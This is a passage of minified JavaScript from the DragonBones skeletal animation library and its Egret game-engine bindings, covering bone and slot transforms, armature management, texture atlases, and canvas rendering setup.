			a.A_TWEEN_ROTATE = "tweenRotate";
			a.A_DISPLAY_INDEX = "displayIndex";
			a.A_Z_ORDER = "z";
			a.A_BLENDMODE = "blendMode";
			a.A_WIDTH =
				"width";
			a.A_HEIGHT = "height";
			a.A_SCALE_MODE = "scaleMode";
			a.A_FIXED_ROTATION = "fixedRotation";
			a.A_X = "x";
			a.A_Y = "y";
			a.A_SKEW_X = "skX";
			a.A_SKEW_Y = "skY";
			a.A_SCALE_X = "scX";
			a.A_SCALE_Y = "scY";
			a.A_PIVOT_X = "pX";
			a.A_PIVOT_Y = "pY";
			a.A_ALPHA_OFFSET = "aO";
			a.A_RED_OFFSET = "rO";
			a.A_GREEN_OFFSET = "gO";
			a.A_BLUE_OFFSET = "bO";
			a.A_ALPHA_MULTIPLIER = "aM";
			a.A_RED_MULTIPLIER = "rM";
			a.A_GREEN_MULTIPLIER = "gM";
			a.A_BLUE_MULTIPLIER = "bM";
			return a
		}
		();
		b.ConstValues = d;
		d.prototype.__class__ = "dragonBones.utils.ConstValues";
		var f = function () {
			function a() {}
			a.transformPointWithParent = function (b, c) {
				var d = a._helpMatrix;
				a.transformToMatrix(c, d);
				d.invert();
				var e = b.x,
				f = b.y;
				b.x = d.a * e + d.c * f + d.tx;
				b.y = d.d * f + d.b * e + d.ty;
				b.skewX = a.formatRadian(b.skewX - c.skewX);
				b.skewY = a.formatRadian(b.skewY - c.skewY)
			};
			a.transformToMatrix = function (a, b) {
				b.a = a.scaleX * Math.cos(a.skewY);
				b.b = a.scaleX * Math.sin(a.skewY);
				b.c = -a.scaleY * Math.sin(a.skewX);
				b.d = a.scaleY * Math.cos(a.skewX);
				b.tx = a.x;
				b.ty = a.y
			};
			a.formatRadian = function (b) {
				b %= a.DOUBLE_PI;
				b > Math.PI && (b -= a.DOUBLE_PI);
				b < -Math.PI && (b += a.DOUBLE_PI);
				return b
			};
			a.DOUBLE_PI = 2 * Math.PI;
			a._helpMatrix = new e.Matrix;
			return a
		}
		();
		b.TransformUtil = f;
		f.prototype.__class__ = "dragonBones.utils.TransformUtil";
		d = function () {
			function b() {}

			b.transformArmatureData = function (a) {
				for (var b = a.getBoneDataList(), c = b.length, d, e; c--; )
					if (d = b[c], d.parent && (e = a.getBoneData(d.parent)))
						d.transform.copy(d.global), f.transformPointWithParent(d.transform, e.global)
			};
			b.transformArmatureDataAnimations = function (a) {
				for (var c = a.getAnimationDataList(), d = c.length; d--; )
					b.transformAnimationData(c[d],
						a)
			};
			b.transformAnimationData = function (a, c) {
				for (var d = c.getSkinData(null), e = c.getBoneDataList(), d = d.getSlotDataList(), m = e.length, g, h, l, u, y, E, D, C, s, J; m--; )
					if (g = e[m], h = a.getTimeline(g.name)) {
						l = null;
						for (var L in d)
							if (l = d[L], l.parent == g.name)
								break;
						u = g.parent ? a.getTimeline(g.parent) : null;
						y = h.getFrameList();
						C = D = E = null;
						J = y.length;
						for (var G = 0; G < J; G++) {
							s = y[G];
							u ? (b._helpTransform1.copy(s.global), b.getTimelineTransform(u, s.position, b._helpTransform2), f.transformPointWithParent(b._helpTransform1, b._helpTransform2),
								s.transform.copy(b._helpTransform1)) : s.transform.copy(s.global);
							s.transform.x -= g.transform.x;
							s.transform.y -= g.transform.y;
							s.transform.skewX -= g.transform.skewX;
							s.transform.skewY -= g.transform.skewY;
							s.transform.scaleX -= g.transform.scaleX;
							s.transform.scaleY -= g.transform.scaleY;
							!h.transformed && l && (s.zOrder -= l.zOrder);
							E || (E = h.originTransform, E.copy(s.transform), E.skewX = f.formatRadian(E.skewX), E.skewY = f.formatRadian(E.skewY), D = h.originPivot, D.x = s.pivot.x, D.y = s.pivot.y);
							s.transform.x -= E.x;
							s.transform.y -=
							E.y;
							s.transform.skewX = f.formatRadian(s.transform.skewX - E.skewX);
							s.transform.skewY = f.formatRadian(s.transform.skewY - E.skewY);
							s.transform.scaleX -= E.scaleX;
							s.transform.scaleY -= E.scaleY;
							h.transformed || (s.pivot.x -= D.x, s.pivot.y -= D.y);
							if (C) {
								var I = s.transform.skewX - C.transform.skewX;
								C.tweenRotate ? 0 < C.tweenRotate ? (0 > I && (s.transform.skewX += 2 * Math.PI, s.transform.skewY += 2 * Math.PI), 1 < C.tweenRotate && (s.transform.skewX += 2 * Math.PI * (C.tweenRotate - 1), s.transform.skewY += 2 * Math.PI * (C.tweenRotate - 1))) : (0 < I && (s.transform.skewX -=
										2 * Math.PI, s.transform.skewY -= 2 * Math.PI), 1 > C.tweenRotate && (s.transform.skewX += 2 * Math.PI * (C.tweenRotate + 1), s.transform.skewY += 2 * Math.PI * (C.tweenRotate + 1))) : (s.transform.skewX = C.transform.skewX + f.formatRadian(s.transform.skewX - C.transform.skewX), s.transform.skewY = C.transform.skewY + f.formatRadian(s.transform.skewY - C.transform.skewY))
							}
							C = s
						}
						h.transformed = !0
					}
			};
			b.getTimelineTransform = function (a, b, d) {
				for (var e = a.getFrameList(), m = e.length, g; m--; )
					if (a = e[m], a.position <= b && a.position + a.duration > b) {
						g = a.tweenEasing;
						m == e.length - 1 || isNaN(g) || b == a.position ? d.copy(a.global) : (b = (b - a.position) / a.duration, g && (b = c.TimelineState.getEaseValue(b, g)), e = e[m + 1], d.x = a.global.x + (e.global.x - a.global.x) * b, d.y = a.global.y + (e.global.y - a.global.y) * b, d.skewX = f.formatRadian(a.global.skewX + (e.global.skewX - a.global.skewX) * b), d.skewY = f.formatRadian(a.global.skewY + (e.global.skewY - a.global.skewY) * b), d.scaleX = a.global.scaleX + (e.global.scaleX - a.global.scaleX) * b, d.scaleY = a.global.scaleY + (e.global.scaleY - a.global.scaleY) * b);
						break
					}
			};
			b.addHideTimeline =
			function (b, c) {
				for (var d = c.getBoneDataList(), e = d.length, f; e--; )
					f = d[e], f = f.name, b.getTimeline(f) || b.addTimeline(a.TransformTimeline.HIDE_TIMELINE, f)
			};
			b._helpTransform1 = new a.DBTransform;
			b._helpTransform2 = new a.DBTransform;
			return b
		}
		();
		b.DBDataUtil = d;
		d.prototype.__class__ = "dragonBones.utils.DBDataUtil"
	})(d.utils || (d.utils = {}));
	var b = d.utils,
	m = function () {
		function b() {
			this.global = new a.DBTransform;
			this.origin = new a.DBTransform;
			this.offset = new a.DBTransform;
			this.tween = new a.DBTransform;
			this.tween.scaleX =
				this.tween.scaleY = 0;
			this._globalTransformMatrix = new e.Matrix;
			this._visible = !0;
			this._isDisplayOnStage = this._isColorChanged = !1;
			this._scaleType = 0;
			this.fixedRotation = !1
		}
		b.prototype.getVisible = function () {
			return this._visible
		};
		b.prototype.setVisible = function (a) {
			this._visible = a
		};
		b.prototype._setParent = function (a) {
			this.parent = a
		};
		b.prototype._setArmature = function (a) {
			this.armature && this.armature._removeDBObject(this);
			(this.armature = a) && this.armature._addDBObject(this)
		};
		b.prototype.dispose = function () {
			this._globalTransformMatrix =
				this.tween = this.offset = this.origin = this.global = this.armature = this.parent = null
		};
		b.prototype._update = function () {
			this.global.scaleX = (this.origin.scaleX + this.tween.scaleX) * this.offset.scaleX;
			this.global.scaleY = (this.origin.scaleY + this.tween.scaleY) * this.offset.scaleY;
			if (this.parent) {
				var a = this.origin.x + this.offset.x + this.tween.x,
				b = this.origin.y + this.offset.y + this.tween.y,
				c = this.parent._globalTransformMatrix;
				this._globalTransformMatrix.tx = this.global.x = c.a * a + c.c * b + c.tx;
				this._globalTransformMatrix.ty = this.global.y =
					c.d * b + c.b * a + c.ty;
				this.fixedRotation ? (this.global.skewX = this.origin.skewX + this.offset.skewX + this.tween.skewX, this.global.skewY = this.origin.skewY + this.offset.skewY + this.tween.skewY) : (this.global.skewX = this.origin.skewX + this.offset.skewX + this.tween.skewX + this.parent.global.skewX, this.global.skewY = this.origin.skewY + this.offset.skewY + this.tween.skewY + this.parent.global.skewY);
				this.parent.scaleMode >= this._scaleType && (this.global.scaleX *= this.parent.global.scaleX, this.global.scaleY *= this.parent.global.scaleY)
			} else
				this._globalTransformMatrix.tx =
					this.global.x = this.origin.x + this.offset.x + this.tween.x, this._globalTransformMatrix.ty = this.global.y = this.origin.y + this.offset.y + this.tween.y, this.global.skewX = this.origin.skewX + this.offset.skewX + this.tween.skewX, this.global.skewY = this.origin.skewY + this.offset.skewY + this.tween.skewY;
			this._globalTransformMatrix.a = this.global.scaleX * Math.cos(this.global.skewY);
			this._globalTransformMatrix.b = this.global.scaleX * Math.sin(this.global.skewY);
			this._globalTransformMatrix.c = -this.global.scaleY * Math.sin(this.global.skewX);
			this._globalTransformMatrix.d = this.global.scaleY * Math.cos(this.global.skewX)
		};
		return b
	}
	();
	d.DBObject = m;
	m.prototype.__class__ = "dragonBones.DBObject";
	var u = function (a) {
		function b(c) {
			a.call(this);
			this._displayBridge = c;
			this._displayList = [];
			this._displayIndex = -1;
			this._scaleType = 1;
			this._offsetZOrder = this._tweenZorder = this._originZOrder = 0;
			this._isHideDisplay = this._isDisplayOnStage = !1;
			this._blendMode = "normal";
			this._displayBridge.updateBlendMode(this._blendMode)
		}
		__extends(b, a);
		b.prototype.getZOrder = function () {
			return this._originZOrder +
			this._tweenZorder + this._offsetZOrder
		};
		b.prototype.setZOrder = function (a) {
			this.getZOrder() != a && (this._offsetZOrder = a - this._originZOrder - this._tweenZorder, this.armature && (this.armature._slotsZOrderChanged = !0))
		};
		b.prototype.getDisplay = function () {
			var a = this._displayList[this._displayIndex];
			return a instanceof h ? a.getDisplay() : a
		};
		b.prototype.setDisplay = function (a) {
			this._displayList[this._displayIndex] = a;
			this._setDisplay(a)
		};
		b.prototype.getBlendMode = function () {
			return this._blendMode
		};
		b.prototype.setBlendMode =
		function (a) {
			this._blendMode != a && (this._blendMode = a, this._displayBridge.getDisplay() && this._displayBridge.updateBlendMode(this._blendMode))
		};
		b.prototype.getChildArmature = function () {
			var a = this._displayList[this._displayIndex];
			return a instanceof h ? a : null
		};
		b.prototype.setChildArmature = function (a) {
			(this._displayList[this._displayIndex] = a) && this._setDisplay(a.getDisplay())
		};
		b.prototype.getDisplayList = function () {
			return this._displayList
		};
		b.prototype.setDisplayList = function (a) {
			if (!a)
				throw Error();
			for (var b =
					this._displayList.length = a.length; b--; )
				this._displayList[b] = a[b];
			0 <= this._displayIndex && (a = this._displayIndex, this._displayIndex = -1, this._changeDisplay(a))
		};
		b.prototype._setDisplay = function (a) {
			this._displayBridge.getDisplay() ? this._displayBridge.setDisplay(a) : (this._displayBridge.setDisplay(a), this.armature && (this._displayBridge.addDisplay(this.armature.getDisplay(), -1), this.armature._slotsZOrderChanged = !0));
			this.updateChildArmatureAnimation();
			a && this._displayBridge.updateBlendMode(this._blendMode);
			!this._isHideDisplay && this._displayBridge.getDisplay() ? this._isDisplayOnStage = !0 : this._isDisplayOnStage = !1
		};
		b.prototype._changeDisplay = function (a) {
			if (0 > a)
				this._isHideDisplay || (this._isHideDisplay = !0, this._displayBridge.removeDisplay(), this.updateChildArmatureAnimation());
			else {
				if (this._isHideDisplay) {
					this._isHideDisplay = !1;
					var b = !0;
					this.armature && (this._displayBridge.addDisplay(this.armature.getDisplay(), -1), this.armature._slotsZOrderChanged = !0)
				}
				var c = this._displayList.length;
				a >= c && 0 < c && (a = c - 1);
				this._displayIndex !=
				a ? (this._displayIndex = a, a = this._displayList[this._displayIndex], a instanceof h ? this._setDisplay(a.getDisplay()) : this._setDisplay(a), this._dislayDataList && this._displayIndex <= this._dislayDataList.length && this.origin.copy(this._dislayDataList[this._displayIndex].transform)) : b && this.updateChildArmatureAnimation()
			}
			!this._isHideDisplay && this._displayBridge.getDisplay() ? this._isDisplayOnStage = !0 : this._isDisplayOnStage = !1
		};
		b.prototype.setVisible = function (a) {
			a != this._visible && (this._visible = a, this._updateVisible(this._visible))
		};
		b.prototype._setArmature = function (b) {
			a.prototype._setArmature.call(this, b);
			this.armature ? (this.armature._slotsZOrderChanged = !0, this._displayBridge.addDisplay(this.armature.getDisplay(), -1)) : this._displayBridge.removeDisplay()
		};
		b.prototype.dispose = function () {
			this._displayBridge && (a.prototype.dispose.call(this), this._displayBridge.dispose(), this._displayList.length = 0, this._dislayDataList = this._displayList = this._displayBridge = null)
		};
		b.prototype._update = function () {
			a.prototype._update.call(this);
			if (this._isDisplayOnStage) {
				var b =
					this.parent._tweenPivot.x,
				c = this.parent._tweenPivot.y;
				if (b || c) {
					var d = this.parent._globalTransformMatrix;
					this._globalTransformMatrix.tx += d.a * b + d.c * c;
					this._globalTransformMatrix.ty += d.b * b + d.d * c
				}
				this._displayBridge.updateTransform(this._globalTransformMatrix, this.global)
			}
		};
		b.prototype._updateVisible = function (a) {
			this._displayBridge.setVisible(this.parent.getVisible() && this._visible && a)
		};
		b.prototype.updateChildArmatureAnimation = function () {
			var a = this.getChildArmature();
			if (a)
				if (this._isHideDisplay)
					a.animation.stop(),
					a.animation._lastAnimationState = null;
				else {
					var b = this.armature ? this.armature.animation.getLastAnimationName() : null;
					b && a.animation.hasAnimation(b) ? a.animation.gotoAndPlay(b) : a.animation.play()
				}
		};
		return b
	}
	(m);
	d.Slot = u;
	u.prototype.__class__ = "dragonBones.Slot";
	var y = function (a) {
		function b() {
			a.call(this);
			this._children = [];
			this._scaleType = 2;
			this._tweenPivot = new e.Point;
			this.scaleMode = 1
		}
		__extends(b, a);
		b.prototype.setVisible = function (a) {
			if (this._visible != a)
				for (this._visible = a, a = this._children.length; a--; ) {
					var b =
						this._children[a];
					b instanceof u && b._updateVisible(this._visible)
				}
		};
		b.prototype._setArmature = function (b) {
			a.prototype._setArmature.call(this, b);
			for (b = this._children.length; b--; )
				this._children[b]._setArmature(this.armature)
		};
		b.prototype.dispose = function () {
			if (this._children) {
				a.prototype.dispose.call(this);
				for (var b = this._children.length; b--; )
					this._children[b].dispose();
				this._children.length = 0;
				this.slot = this._tweenPivot = this._children = null
			}
		};
		b.prototype.contains = function (a) {
			if (!a)
				throw Error();
			if (a ==
				this)
				return !1;
			for (; a != this && null != a; )
				a = a.parent;
			return a == this
		};
		b.prototype.addChild = function (a) {
			if (!a)
				throw Error();
			if (a == this || a instanceof b && a.contains(this))
				throw Error("An Bone cannot be added as a child to itself or one of its children (or children's children, etc.)");
			a.parent && a.parent.removeChild(a);
			this._children[this._children.length] = a;
			a._setParent(this);
			a._setArmature(this.armature);
			!this.slot && a instanceof u && (this.slot = a)
		};
		b.prototype.removeChild = function (a) {
			if (!a)
				throw Error();
			var b =
				this._children.indexOf(a);
			if (0 <= b)
				this._children.splice(b, 1), a._setParent(null), a._setArmature(null), a == this.slot && (this.slot = null);
			else
				throw Error();
		};
		b.prototype.getSlots = function () {
			for (var a = [], b = this._children.length; b--; )
				this._children[b]instanceof u && a.unshift(this._children[b]);
			return a
		};
		b.prototype._arriveAtFrame = function (a, c, d, e) {
			if (a) {
				if (c = d.getMixingTransform(this.name), !d.displayControl || 2 != c && -1 != c || this.displayController && this.displayController != d.name || !this.slot || (c = a.displayIndex,
						0 <= c && !isNaN(a.zOrder) && a.zOrder != this.slot._tweenZorder && (this.slot._tweenZorder = a.zOrder, this.armature._slotsZOrderChanged = !0), this.slot._changeDisplay(c), this.slot._updateVisible(a.visible)), a.event && this.armature.hasEventListener(f.FrameEvent.BONE_FRAME_EVENT) && (c = new f.FrameEvent(f.FrameEvent.BONE_FRAME_EVENT), c.bone = this, c.animationState = d, c.frameLabel = a.event, this.armature._eventList.push(c)), a.sound && b._soundManager.hasEventListener(f.SoundEvent.SOUND) && (c = new f.SoundEvent(f.SoundEvent.SOUND),
						c.armature = this.armature, c.animationState = d, c.sound = a.sound, b._soundManager.dispatchEvent(c)), a.action)
					for (var m in this._children)
						this._children[m]instanceof u && (d = this._children[m].getChildArmature()) && d.animation.gotoAndPlay(a.action)
			} else
				this.slot && this.slot._changeDisplay(-1)
		};
		b.prototype._updateColor = function (a, b, c, d, e, f, m, g, h) {
			(h || this._isColorChanged) && this.slot._displayBridge.updateColor(a, b, c, d, e, f, m, g);
			this._isColorChanged = h
		};
		b._soundManager = f.SoundEventManager.getInstance();
		return b
	}
	(m);
	d.Bone = y;
	y.prototype.__class__ = "dragonBones.Bone";
	var h = function (a) {
		function b(d) {
			a.call(this);
			this.animation = new c.Animation(this);
			this._display = d;
			this._slotsZOrderChanged = !1;
			this._slotList = [];
			this._boneList = [];
			this._eventList = []
		}
		__extends(b, a);
		b.prototype.getDisplay = function () {
			return this._display
		};
		b.prototype.dispose = function () {
			if (this.animation) {
				this.animation.dispose();
				for (var a = this._slotList.length; a--; )
					this._slotList[a].dispose();
				for (a = this._boneList.length; a--; )
					this._boneList[a].dispose();
				this._slotList.length = 0;
				this._boneList.length = 0;
				this._eventList.length = 0;
				this.animation = this._display = this._eventList = this._boneList = this._slotList = null
			}
		};
		b.prototype.advanceTime = function (a) {
			this.animation.advanceTime(a);
			a *= this.animation.timeScale;
			for (var b = this._boneList.length; b--; )
				this._boneList[b]._update();
			for (var b = this._slotList.length, c; b--; )
				c = this._slotList[b], c._update(), c._isDisplayOnStage && (c = c.getChildArmature()) && c.advanceTime(a);
			this._slotsZOrderChanged && (this.updateSlotsZOrder(),
				this.hasEventListener(f.ArmatureEvent.Z_ORDER_UPDATED) && this.dispatchEvent(new f.ArmatureEvent(f.ArmatureEvent.Z_ORDER_UPDATED)));
			if (this._eventList.length) {
				a = this._eventList.length;
				for (b = 0; b < a; b++)
					this.dispatchEvent(this._eventList[b]);
				this._eventList.length = 0
			}
		};
		b.prototype.getSlots = function (a) {
			"undefined" === typeof a && (a = !0);
			return a ? this._slotList.concat() : this._slotList
		};
		b.prototype.getBones = function (a) {
			"undefined" === typeof a && (a = !0);
			return a ? this._boneList.concat() : this._boneList
		};
		b.prototype.getSlot =
		function (a) {
			for (var b = this._slotList.length; b--; )
				if (this._slotList[b].name == a)
					return this._slotList[b];
			return null
		};
		b.prototype.getSlotByDisplay = function (a) {
			if (a)
				for (var b = this._slotList.length; b--; )
					if (this._slotList[b].getDisplay() == a)
						return this._slotList[b];
			return null
		};
		b.prototype.removeSlot = function (a) {
			if (!a)
				throw Error();
			if (0 <= this._slotList.indexOf(a))
				a.parent.removeChild(a);
			else
				throw Error();
		};
		b.prototype.removeSlotByName = function (a) {
			a && (a = this.getSlot(a)) && this.removeSlot(a)
		};
		b.prototype.getBone =
		function (a) {
			for (var b = this._boneList.length; b--; )
				if (this._boneList[b].name == a)
					return this._boneList[b];
			return null
		};
		b.prototype.getBoneByDisplay = function (a) {
			return (a = this.getSlotByDisplay(a)) ? a.parent : null
		};
		b.prototype.removeBone = function (a) {
			if (!a)
				throw Error();
			if (0 <= this._boneList.indexOf(a))
				a.parent ? a.parent.removeChild(a) : a._setArmature(null);
			else
				throw Error();
		};
		b.prototype.removeBoneByName = function (a) {
			a && (a = this.getBone(a)) && this.removeBone(a)
		};
		b.prototype.addChild = function (a, b) {
			if (!a)
				throw Error();
			if (b) {
				var c = this.getBone(b);
				if (c)
					c.addChild(a);
				else
					throw Error();
			} else
				a.parent && a.parent.removeChild(a), a._setArmature(this)
		};
		b.prototype.updateSlotsZOrder = function () {
			this._slotList.sort(this.sortSlot);
			for (var a = this._slotList.length, b; a--; )
				b = this._slotList[a], b._isDisplayOnStage && b._displayBridge.addDisplay(this._display, -1);
			this._slotsZOrderChanged = !1
		};
		b.prototype._addDBObject = function (a) {
			a instanceof u ? 0 > this._slotList.indexOf(a) && (this._slotList[this._slotList.length] = a) : a instanceof y && 0 > this._boneList.indexOf(a) &&
			(this._boneList[this._boneList.length] = a, this._sortBoneList())
		};
		b.prototype._removeDBObject = function (a) {
			a instanceof u ? (a = this._slotList.indexOf(a), 0 <= a && this._slotList.splice(a, 1)) : a instanceof y && (a = this._boneList.indexOf(a), 0 <= a && this._boneList.splice(a, 1))
		};
		b.prototype._sortBoneList = function () {
			var a = this._boneList.length;
			if (0 != a) {
				for (var b = [], c, d, e; a--; ) {
					c = 0;
					for (e = d = this._boneList[a]; e; )
						c++, e = e.parent;
					b[a] = {
						level : c,
						bone : d
					}
				}
				b.sort(this.sortBone);
				for (a = b.length; a--; )
					this._boneList[a] = b[a].bone
			}
		};
		b.prototype._arriveAtFrame = function (a, c, d, e) {
			a.event && this.hasEventListener(f.FrameEvent.ANIMATION_FRAME_EVENT) && (c = new f.FrameEvent(f.FrameEvent.ANIMATION_FRAME_EVENT), c.animationState = d, c.frameLabel = a.event, this._eventList.push(c));
			a.sound && b._soundManager.hasEventListener(f.SoundEvent.SOUND) && (c = new f.SoundEvent(f.SoundEvent.SOUND), c.armature = this, c.animationState = d, c.sound = a.sound, b._soundManager.dispatchEvent(c));
			a.action && d.isPlaying && this.animation.gotoAndPlay(a.action)
		};
		b.prototype.sortSlot =
		function (a, b) {
			return a.getZOrder() < b.getZOrder() ? 1 : -1
		};
		b.prototype.sortBone = function (a, b) {
			return a.level < b.level ? 1 : -1
		};
		b._soundManager = f.SoundEventManager.getInstance();
		return b
	}
	(f.EventDispatcher);
	d.Armature = h;
	h.prototype.__class__ = "dragonBones.Armature"
})(dragonBones || (dragonBones = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var c = function () {
			function a() {}

			a.prototype.getVisible = function () {
				return this._display ? this._display.visible : !1
			};
			a.prototype.setVisible = function (a) {
				this._display && (this._display.visible = a)
			};
			a.prototype.getDisplay = function () {
				return this._display
			};
			a.prototype.setDisplay = function (a) {
				if (this._display != a) {
					if (this._display) {
						var c = this._display.parent;
						if (c)
							var d = c.getChildIndex(this._display);
						this.removeDisplay()
					}
					this._display = a;
					this.addDisplay(c, d)
				}
			};
			a.prototype.dispose = function () {
				this._display =
					null
			};
			a.prototype.updateTransform = function (b, c) {
				this._display._x = b.tx;
				this._display._y = b.ty;
				this._display._skewX = c.skewX * a.RADIAN_TO_ANGLE;
				this._display._skewY = c.skewY * a.RADIAN_TO_ANGLE;
				this._display._scaleX = c.scaleX;
				this._display._scaleY = c.scaleY;
				this._display._setSizeDirty()
			};
			a.prototype.updateColor = function (a, c, d, e, f, g, l, k) {
				this._display && (this._display._alpha = f)
			};
			a.prototype.updateBlendMode = function (a) {
				this._display && a && (this._display.blendMode = a)
			};
			a.prototype.addDisplay = function (a, c) {
				a && this._display &&
				(this._display._parent && this._display._parent.removeChild(this._display), 0 > c ? a.addChild(this._display) : a.addChildAt(this._display, Math.min(c, a.numChildren)))
			};
			a.prototype.removeDisplay = function () {
				this._display && this._display._parent && this._display._parent.removeChild(this._display)
			};
			a.RADIAN_TO_ANGLE = 180 / Math.PI;
			return a
		}
		();
		d.DragonBonesEgretBridge = c;
		c.prototype.__class__ = "dragonBones.display.DragonBonesEgretBridge"
	})(d.display || (d.display = {}));
	var e = d.display;
	(function (e) {
		var c = function () {
			function a(a,
				c, e) {
				"undefined" === typeof e && (e = 1);
				this.texture = a;
				this.textureAtlasRawData = c;
				this._textureData = {};
				this.scale = e;
				this.name = c[d.utils.ConstValues.A_NAME];
				this.parseData(c);
				this.spriteSheet = new egret.SpriteSheet(a)
			}
			a.prototype.getTexture = function (a) {
				var c = this.spriteSheet.getTexture(a);
				c || (c = this._textureData[a], c = this.spriteSheet.createTexture(a, c.x, c.y, c.width, c.height));
				return c
			};
			a.prototype.dispose = function () {
				this.texture = null
			};
			a.prototype.getRegion = function (a) {
				throw Error("error");
			};
			a.prototype.parseData =
			function (a) {
				for (var c = a.SubTexture.length, d = 0; d < c; d++) {
					var e = a.SubTexture[d];
					this._textureData[e.name] = e
				}
			};
			return a
		}
		();
		e.EgretTextureAtlas = c;
		c.prototype.__class__ = "dragonBones.textures.EgretTextureAtlas"
	})(d.textures || (d.textures = {}));
	(function (f) {
		var c = function (a) {
			function b() {
				a.call(this)
			}
			__extends(b, a);
			b.prototype._generateArmature = function () {
				return new d.Armature(new egret.DisplayObjectContainer)
			};
			b.prototype._generateSlot = function () {
				return new d.Slot(new e.DragonBonesEgretBridge)
			};
			b.prototype._generateDisplay =
			function (a, b, c, d) {
				var e = new egret.Bitmap;
				e.texture = a.getTexture(b);
				e.anchorOffsetX = c;
				e.anchorOffsetY = d;
				return e
			};
			return b
		}
		(f.BaseFactory);
		f.EgretFactory = c;
		c.prototype.__class__ = "dragonBones.factorys.EgretFactory"
	})(d.factorys || (d.factorys = {}))
})(dragonBones || (dragonBones = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			"undefined" === typeof a && (a = 60);
			e.call(this);
			this.frameRate = a;
			this._time = 0;
			60 == a && (c.requestAnimationFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame, c.cancelAnimationFrame = window.cancelAnimationFrame || window.msCancelAnimationFrame || window.mozCancelAnimationFrame || window.webkitCancelAnimationFrame || window.oCancelAnimationFrame || window.cancelRequestAnimationFrame ||
					window.msCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.webkitCancelRequestAnimationFrame);
			c.requestAnimationFrame || (c.requestAnimationFrame = function (b) {
				return window.setTimeout(b, 1E3 / a)
			});
			c.cancelAnimationFrame || (c.cancelAnimationFrame = function (a) {
				return window.clearTimeout(a)
			});
			c.instance = this;
			this.registerListener()
		}
		__extends(c, e);
		c.prototype.enterFrame = function () {
			var a = c.instance,
			b = c._thisObject,
			e = c._callback,
			f = d.getTimer();
			e.call(b,
				f - a._time);
			a._time = f;
			a._requestAnimationId = c.requestAnimationFrame.call(window, c.prototype.enterFrame)
		};
		c.prototype.executeMainLoop = function (a, b) {
			c._callback = a;
			c._thisObject = b;
			this.enterFrame()
		};
		c.prototype.reset = function () {
			var a = c.instance;
			a._requestAnimationId && (a._time = d.getTimer(), c.cancelAnimationFrame.call(window, a._requestAnimationId), a.enterFrame())
		};
		c.prototype.registerListener = function () {
			var a = function () {
				c.instance.reset()
			},
			b = function () {
				document[d] || a()
			};
			window.onfocus = a;
			window.onblur = function () {};
			var d,
			e;
			"undefined" !== typeof document.hidden ? (d = "hidden", e = "visibilitychange") : "undefined" !== typeof document.mozHidden ? (d = "mozHidden", e = "mozvisibilitychange") : "undefined" !== typeof document.msHidden ? (d = "msHidden", e = "msvisibilitychange") : "undefined" !== typeof document.webkitHidden && (d = "webkitHidden", e = "webkitvisibilitychange");
			"onpageshow" in window && "onpagehide" in window && window.addEventListener("pageshow", a, !1);
			d && e && document.addEventListener(e, b, !1)
		};
		return c
	}
	(d.DeviceContext);
	d.HTML5DeviceContext =
		e;
	e.prototype.__class__ = "egret.HTML5DeviceContext"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			this.canvas = a;
			this.canvasContext = a.getContext("2d");
			var b = this.canvasContext.setTransform,
			c = this;
			this.canvasContext.setTransform = function (a, d, e, f, l, k) {
				c._matrixA = a;
				c._matrixB = d;
				c._matrixC = e;
				c._matrixD = f;
				c._matrixTx = l;
				c._matrixTy = k;
				b.call(c.canvasContext, a, d, e, f, l, k)
			};
			this._matrixA = 1;
			this._matrixC = this._matrixB = 0;
			this._matrixD = 1;
			this._transformTy = this._transformTx = this._matrixTy = this._matrixTx = 0;
			e.call(this)
		}
		__extends(c, e);
		c.prototype.clearScreen = function () {
			this.setTransform(d.Matrix.identity.identity());
			for (var a = d.RenderFilter.getInstance().getDrawAreaList(), b = 0, c = a.length; b < c; b++) {
				var e = a[b];
				this.clearRect(e.x + this._transformTx, e.y + this._transformTy, e.width, e.height)
			}
			this.renderCost = 0
		};
		c.prototype.clearRect = function (a, b, c, d) {
			this.canvasContext.clearRect(a, b, c, d)
		};
		c.prototype.drawImage = function (a, b, c, u, y, h, g, l, k) {
			b /= d.MainContext.instance.rendererContext.texture_scale_factor;
			c /= d.MainContext.instance.rendererContext.texture_scale_factor;
			u /= d.MainContext.instance.rendererContext.texture_scale_factor;
			y /= d.MainContext.instance.rendererContext.texture_scale_factor;
			a = a._bitmapData;
			h += this._transformTx;
			g += this._transformTy;
			var n = d.getTimer();
			this.canvasContext.drawImage(a, b, c, u, y, h, g, l, k);
			e.prototype.drawImage.call(this, a, b, c, u, y, h, g, l, k);
			this.renderCost += d.getTimer() - n
		};
		c.prototype.setTransform = function (a) {
			1 == a.a && 0 == a.b && 0 == a.c && 1 == a.d && 1 == this._matrixA && 0 == this._matrixB && 0 == this._matrixC && 1 == this._matrixD ? (this._transformTx = a.tx - this._matrixTx, this._transformTy = a.ty - this._matrixTy) : (this._transformTx =
					this._transformTy = 0, this._matrixA == a.a && this._matrixB == a.b && this._matrixC == a.c && this._matrixD == a.d && this._matrixTx == a.tx && this._matrixTy == a.ty || this.canvasContext.setTransform(a.a, a.b, a.c, a.d, a.tx, a.ty))
		};
		c.prototype.setAlpha = function (a, b) {
			a != this.canvasContext.globalAlpha && (this.canvasContext.globalAlpha = a);
			b ? (this.blendValue = b, this.canvasContext.globalCompositeOperation = b) : this.blendValue != d.BlendMode.NORMAL && (this.blendValue = d.BlendMode.NORMAL, this.canvasContext.globalCompositeOperation = d.BlendMode.NORMAL)
		};
		c.prototype.setupFont = function (a) {
			var b = this.canvasContext,
			c = a.italic ? "italic " : "normal ",
			c = c + (a.bold ? "bold " : "normal "),
			c = c + (a.size + "px " + a.fontFamily);
			b.font = c;
			b.textAlign = "left";
			b.textBaseline = "middle"
		};
